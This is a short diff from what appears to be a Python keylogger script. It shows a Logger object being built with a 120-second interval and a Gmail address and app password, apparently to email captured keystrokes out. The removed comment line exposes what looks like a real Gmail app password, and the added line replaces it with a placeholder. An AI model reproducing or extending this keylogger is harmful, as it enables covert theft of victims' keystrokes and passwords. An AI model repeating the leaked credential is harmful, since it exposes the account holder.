@@ -49,7 +49,7 @@ class Logger:
             keyboard.join()
 #can also: 
 #import keyLog
-#logger = keyLog.Logger(120,'benpro4433@gmail.com','pismjflzgewqigwx') on another script
+#logger = keyLog.Logger(120,'benpro4433@gmail.com','APPPASS') on another script
 
 logger = keyLog.Logger(120,'benpro4433@gmail.com','APPPASS')
 try:
